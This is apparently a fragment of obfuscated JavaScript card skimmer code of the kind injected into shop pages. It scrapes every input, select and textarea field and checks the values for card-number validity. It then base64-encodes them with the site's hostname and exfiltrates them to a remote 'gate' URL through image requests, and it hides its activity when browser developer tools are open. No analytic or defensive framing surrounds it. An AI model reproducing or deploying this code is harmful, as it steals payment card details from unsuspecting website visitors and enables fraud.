_0x3669f3=_0x4a88af?_0x4a94('0x9'):_0x4a94('0xa');if(!(_0x3b665e&&_0x4a88af)&&(window[_0x4a94('0xb')]&&window['\x46\x69\x72\x65\x62\x75\x67']['\x63\x68\x72\x6f\x6d\x65']&&window[_0x4a94('0xb')][_0x4a94('0xc')][_0x4a94('0xd')]||_0x4a88af||_0x3b665e)){if(!_0x5928b6[_0x4a94('0x4')]||_0x5928b6[_0x4a94('0xe')]!==_0x3669f3){_0x5494fb(!![],_0x3669f3);}_0x5928b6[_0x4a94('0x4')]=!![];_0x5928b6[_0x4a94('0xe')]=_0x3669f3;}else{if(_0x5928b6[_0x4a94('0x4')]){_0x5494fb(![],undefined);}_0x5928b6[_0x4a94('0x4')]=![];_0x5928b6[_0x4a94('0xe')]=undefined;}},0x1f4);if(typeof module!==_0x4a94('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x4a94('0x10')]=_0x5928b6;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5928b6;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x4c2644=0x0,_0x3f915e,_0x2fd613;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x4c2644;for(_0x3f915e=0x0;_0x3f915e<this[_0x4a94('0x2')];_0x3f915e++){_0x2fd613=this[_0x4a94('0x11')](_0x3f915e);_0x4c2644=(_0x4c2644<<0x5)-_0x4c2644+_0x2fd613;_0x4c2644|=0x0;}return _0x4c2644;};var _0x4b4698={};_0x4b4698[_0x4a94('0x12')]=_0x4a94('0x13');_0x4b4698[_0x4a94('0x14')]={};_0x4b4698[_0x4a94('0x15')]=[];_0x4b4698[_0x4a94('0x16')]=![];_0x4b4698['\x53\x61\x76\x65\x50\x61\x72\x61\x6d']=function(_0x4e8d9b){if(_0x4e8d9b.id!==undefined&&_0x4e8d9b.id!=''&&_0x4e8d9b.id!==null&&_0x4e8d9b.value.length<0x100&&_0x4e8d9b.value.length>0x0){if(_0x3d4626(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20',''))&&_0x3c77d5(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20','')))_0x4b4698.IsValid=!![];_0x4b4698.Data[_0x4e8d9b.id]=_0x4e8d9b.value;return;}if(_0x4e8d9b.name!==undefined&&_0x4e8d9b.name!=''&&_0x4e8d9b.name!==null&&_0x4e8d9b.value.length<0x100&&_0x4e8d9b.value.length>0x0){if(_0x3d4626(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20',''))&&_0x3c77d5(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20','')))_0x4b4698.IsValid=!![];_0x4b4698.Data[_0x4e8d9b.name]=_0x4e8d9b.value;return;}};_0x4b4698[_0x4a94('0x17')]=function(){var _0x422f6e=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x19b55c=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x3672f0=document.getElementsByTagName(_0x4a94('0x18'));for(var _0x11de8e=0x0;_0x11de8e<_0x422f6e.length;_0x11de8e++)_0x4b4698.SaveParam(_0x422f6e[_0x11de8e]);for(var _0x11de8e=0x0;_0x11de8e<_0x19b55c.length;_0x11de8e++)_0x4b4698.SaveParam(_0x19b55c[_0x11de8e]);for(var _0x11de8e=0x0;_0x11de8e<_0x3672f0.length;_0x11de8e++)_0x4b4698.SaveParam(_0x3672f0[_0x11de8e]);};_0x4b4698[_0x4a94('0x19')]=function(){if(!window.devtools.isOpen&&_0x4b4698.IsValid){_0x4b4698.Data[_0x4a94('0x1a')]=location.hostname;var _0x5422f5=encodeURIComponent(window.btoa(JSON.stringify(_0x4b4698.Data)));var _0x121b16=_0x5422f5.hashCode();for(var _0x30a565=0x0;_0x30a565<_0x4b4698.Sent.length;_0x30a565++)if(_0x4b4698.Sent[_0x30a565]==_0x121b16)return;_0x4b4698.LoadImage(_0x5422f5);}};_0x4b4698['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x4b4698.SaveAllFields();_0x4b4698.SendData();};_0x4b4698[_0x4a94('0x1b')]=function(_0x384a4b){_0x4b4698.Sent.push(_0x384a4b.hashCode());var _0x45e270=document.createElement(_0x4a94('0x1c'));_0x45e270.src=_0x4b4698.GetImageUrl(_0x384a4b);};_0x4b4698['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x9b2c2f){return _0x4b4698.Gate+_0x4a94('0x1d')+_0x9b2c2f;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x4a94('0x1e')]===_0x4a94('0x1f')){window[_0x4a94('0x20')](_0x4b4698['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};